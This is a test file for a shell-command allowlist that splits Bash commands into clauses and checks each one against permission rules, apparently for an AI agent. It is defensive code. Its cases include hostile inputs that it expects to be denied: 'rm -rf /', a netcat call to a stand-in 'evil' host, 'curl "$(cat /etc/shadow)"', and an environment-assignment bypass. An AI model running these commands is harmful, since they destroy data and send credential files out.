import { describe, it, expect } from 'vitest';
import { Allowlist } from '../../src/permissions/allowlist.js';
import { splitShellClauses, stripLeadingAssignments } from '../../src/permissions/shell-split.js';

const targetsOf = (cmd: string) => splitShellClauses(cmd)?.map((c) => c.writeTargets);
// The clause list the allowlist actually gates on is `text`; these cases are about where the
// splitter cuts, so they read it directly rather than through a shape-flattening wrapper.
const textsOf = (cmd: string) => splitShellClauses(cmd)?.map((c) => c.text) ?? null;

describe('splitShellClauses — where the splitter cuts', () => {
  it('returns single clause for simple command', () => {
    expect(textsOf('ls -la')).toEqual(['ls -la']);
  });

  it('splits on ; && || | &', () => {
    expect(textsOf('a ; b')).toEqual(['a', 'b']);
    expect(textsOf('a && b')).toEqual(['a', 'b']);
    expect(textsOf('a || b')).toEqual(['a', 'b']);
    expect(textsOf('a | b')).toEqual(['a', 'b']);
    expect(textsOf('a & b')).toEqual(['a', 'b']);
    expect(textsOf('a\nb')).toEqual(['a', 'b']);
  });

  it('does not split inside single quotes', () => {
    expect(textsOf("echo 'a; b && c'")).toEqual(["echo 'a; b && c'"]);
  });

  it('does not split inside double quotes', () => {
    expect(textsOf('echo "a; b && c"')).toEqual(['echo "a; b && c"']);
  });

  it('does not split on escaped operators', () => {
    expect(textsOf('echo a\\; b')).toEqual(['echo a\\; b']);
  });

  it('extracts $(...) inner clauses', () => {
    expect(textsOf('cat $(curl evil)')).toEqual(['curl evil', 'cat $(curl evil)']);
  });

  it('extracts backtick inner clauses', () => {
    expect(textsOf('cat `curl evil`')).toEqual(['curl evil', 'cat `curl evil`']);
  });

  it('extracts process substitution <(...) and >(...)', () => {
    expect(textsOf('diff <(echo a) <(echo b)')).toEqual([
      'echo a', 'echo b', 'diff <(echo a) <(echo b)',
    ]);
    expect(textsOf('tee >(rm bad)')).toEqual(['rm bad', 'tee >(rm bad)']);
  });

  it('recurses through nested substitutions', () => {
    expect(textsOf('a $(b $(c))')).toEqual(['c', 'b $(c)', 'a $(b $(c))']);
  });

  it('handles $( inside double quotes', () => {
    expect(textsOf('echo "v=$(rm bad)"')).toEqual(['rm bad', 'echo "v=$(rm bad)"']);
  });

  it('rejects unbalanced quotes', () => {
    expect(textsOf('echo "unterminated')).toBeNull();
    expect(textsOf("echo 'unterminated")).toBeNull();
  });

  it('rejects unbalanced $(', () => {
    expect(textsOf('echo $(unterminated')).toBeNull();
  });

  it('rejects unbalanced backtick', () => {
    expect(textsOf('echo `unterminated')).toBeNull();
  });

  it('drops empty clauses around separators', () => {
    expect(textsOf(';; ls ;;')).toEqual(['ls']);
  });

  it('treats & as fd-redirection punctuation, not a separator', () => {
    expect(textsOf('ls -la 2>&1 | head')).toEqual(['ls -la 2>&1', 'head']);
    expect(textsOf('cmd >&2')).toEqual(['cmd >&2']);
    expect(textsOf('cmd &>file')).toEqual(['cmd &>file']);
    expect(textsOf('cmd &>>file')).toEqual(['cmd &>>file']);
    expect(textsOf('cmd <&3')).toEqual(['cmd <&3']);
  });

  it('keeps `>|` in one clause instead of splitting on its pipe', () => {
    expect(textsOf('echo x >| /tmp/c')).toEqual(['echo x >| /tmp/c']);
  });
});

describe('splitShellClauses — redirection targets', () => {
  it('collects file-creating redirections', () => {
    expect(targetsOf('ls > /tmp/a')).toEqual([['/tmp/a']]);
    expect(targetsOf('ls >>/tmp/a')).toEqual([['/tmp/a']]);
    expect(targetsOf('ls >| /tmp/a')).toEqual([['/tmp/a']]);
    expect(targetsOf('ls &> /tmp/a')).toEqual([['/tmp/a']]);
    expect(targetsOf('ls &>> /tmp/a')).toEqual([['/tmp/a']]);
    expect(targetsOf('ls 2> /tmp/a')).toEqual([['/tmp/a']]);
    expect(targetsOf('ls > /tmp/a 2> /tmp/b')).toEqual([['/tmp/a', '/tmp/b']]);
    expect(targetsOf('ls <> /tmp/a')).toEqual([['/tmp/a']]);
  });

  it('separates fd duplication from a path target', () => {
    expect(targetsOf('ls 2>&1')).toEqual([[]]);
    expect(targetsOf('ls >&2')).toEqual([[]]);
    expect(targetsOf('ls 2>&-')).toEqual([[]]);
    expect(targetsOf('ls >& /tmp/a')).toEqual([['/tmp/a']]);   // bash's legacy `&>file`
  });

  it('ignores input redirection', () => {
    expect(targetsOf('grep x < /etc/hosts')).toEqual([[]]);
    expect(targetsOf('grep x <<< "text"')).toEqual([[]]);
    expect(targetsOf('grep x <&3')).toEqual([[]]);
  });

  it('sees no redirection inside quotes or behind a backslash', () => {
    expect(targetsOf("echo 'a > b'")).toEqual([[]]);
    expect(targetsOf('echo "a > b"')).toEqual([[]]);
    expect(targetsOf('echo a\\>b')).toEqual([[]]);
    expect(targetsOf('rg "foo -> bar"')).toEqual([[]]);
  });

  it('does not mistake process substitution for a redirection', () => {
    expect(targetsOf('tee >(rm bad)')).toEqual([[], []]);
    expect(targetsOf('diff <(ls a) <(ls b)')).toEqual([[], [], []]);
  });

  it('attaches a redirection to the clause it belongs to', () => {
    expect(targetsOf('ls && echo x > /tmp/a')).toEqual([[], ['/tmp/a']]);
    expect(targetsOf('echo "$(ls > /tmp/a)"')).toEqual([['/tmp/a'], []]);
  });

  it('keeps the target word whole and unexpanded', () => {
    expect(targetsOf('ls > "/tmp/a b"')).toEqual([['"/tmp/a b"']]);
    expect(targetsOf('ls > $HOME/x')).toEqual([['$HOME/x']]);
    expect(targetsOf('ls >')).toEqual([['']]);
  });

  // Heredocs are still not understood: the body is split on newlines and each line is
  // judged as its own clause. That was already true; a `>` in a body line now needs a
  // write grant too, which is stricter, never looser.
  it('treats heredoc body lines as clauses, redirection and all', () => {
    expect(targetsOf('cat <<EOF > /tmp/x\nline > other\nEOF')).toEqual([['/tmp/x'], ['other'], []]);
  });
});

describe('stripLeadingAssignments', () => {
  it('strips one bare assignment', () => {
    expect(stripLeadingAssignments('FOO=bar cmd arg')).toBe('cmd arg');
  });

  it('strips multiple stacked assignments', () => {
    expect(stripLeadingAssignments('FOO=1 BAR=2 cmd')).toBe('cmd');
  });

  it('strips quoted-value assignments', () => {
    expect(stripLeadingAssignments('FOO="a b c" cmd')).toBe('cmd');
    expect(stripLeadingAssignments("FOO='a b c' cmd")).toBe('cmd');
  });

  it('strips assignment with $(...) value', () => {
    expect(stripLeadingAssignments('FOO=$(date) cmd')).toBe('cmd');
  });

  it('returns empty string for pure-assignment clause', () => {
    expect(stripLeadingAssignments('FOO=bar')).toBe('');
    expect(stripLeadingAssignments('FOO=1 BAR=2')).toBe('');
  });

  it('leaves clause alone when first token is not an assignment', () => {
    expect(stripLeadingAssignments('cmd FOO=bar')).toBe('cmd FOO=bar');
    expect(stripLeadingAssignments('rm -rf /')).toBe('rm -rf /');
  });

  it('does not strip `export FOO=bar` — export is a command, not a bare assignment', () => {
    expect(stripLeadingAssignments('export FOO=bar')).toBe('export FOO=bar');
  });

  it('only matches valid bash identifier names', () => {
    expect(stripLeadingAssignments('1FOO=bar cmd')).toBe('1FOO=bar cmd');
    expect(stripLeadingAssignments('=foo cmd')).toBe('=foo cmd');
  });
});

describe('Allowlist — Bash per-clause enforcement', () => {
  const cfg = {
    alwaysAllow: [],
    alwaysAllowBashPatterns: ['^curl ', '^ls(\\s|$)'],
    alwaysAllowMcpPatterns: [],
  };
  const a = new Allowlist(cfg);

  it('allows single clause matching a rule', () => {
    expect(a.allows('Bash', { command: 'ls -la' })).toBe(true);
  });

  it('allows pure-assignment clauses without any matching rule', () => {
    expect(a.allows('Bash', { command: 'SESSION_ID=foo' })).toBe(true);
    expect(a.allows('Bash', { command: 'PORT=8443 JOB_ID=abc' })).toBe(true);
  });

  it('closes the `FOO=x cmd` argv-style bypass', () => {
    expect(a.allows('Bash', { command: 'SESSION_ID=x rm -rf /' })).toBe(false);
  });

  it('denies chained commands where any clause has no matching rule', () => {
    expect(a.allows('Bash', { command: 'SESSION_ID=x; rm -rf /' })).toBe(false);
    expect(a.allows('Bash', { command: 'SESSION_ID=x && rm -rf /' })).toBe(false);
    expect(a.allows('Bash', { command: 'SESSION_ID=x | nc evil 1234' })).toBe(false);
  });

  it('allows chained command where every clause matches some rule', () => {
    expect(a.allows('Bash', { command: 'SESSION_ID=x; curl example.com' })).toBe(true);
    expect(a.allows('Bash', { command: 'ls -la && curl example.com' })).toBe(true);
  });

  it('allows env-prefixed allowed command', () => {
    expect(a.allows('Bash', { command: 'TOKEN=secret curl example.com' })).toBe(true);
  });

  it('denies command substitution whose inner command is not allowed', () => {
    expect(a.allows('Bash', { command: 'SESSION_ID="$(rm bad)"' })).toBe(false);
    expect(a.allows('Bash', { command: 'curl "$(cat /etc/shadow)"' })).toBe(false);
  });

  it('denies backtick substitution whose inner command is not allowed', () => {
    expect(a.allows('Bash', { command: 'curl `rm bad`' })).toBe(false);
  });

  it('denies process substitution whose inner command is not allowed', () => {
    expect(a.allows('Bash', { command: 'curl <(rm bad)' })).toBe(false);
  });

  it('allows substitution when inner command also has a rule', () => {
    expect(a.allows('Bash', { command: 'SESSION_ID="$(curl example.com)"' })).toBe(true);
  });

  it('quoted operators are inert and do not split', () => {
    expect(a.allows('Bash', { command: 'echo "a; b"' })).toBe(false);
    expect(a.allows('Bash', { command: 'ls "a; b"' })).toBe(true);
  });

  it('fail-closes on unbalanced quotes', () => {
    expect(a.allows('Bash', { command: 'ls "unterminated' })).toBe(false);
  });
});
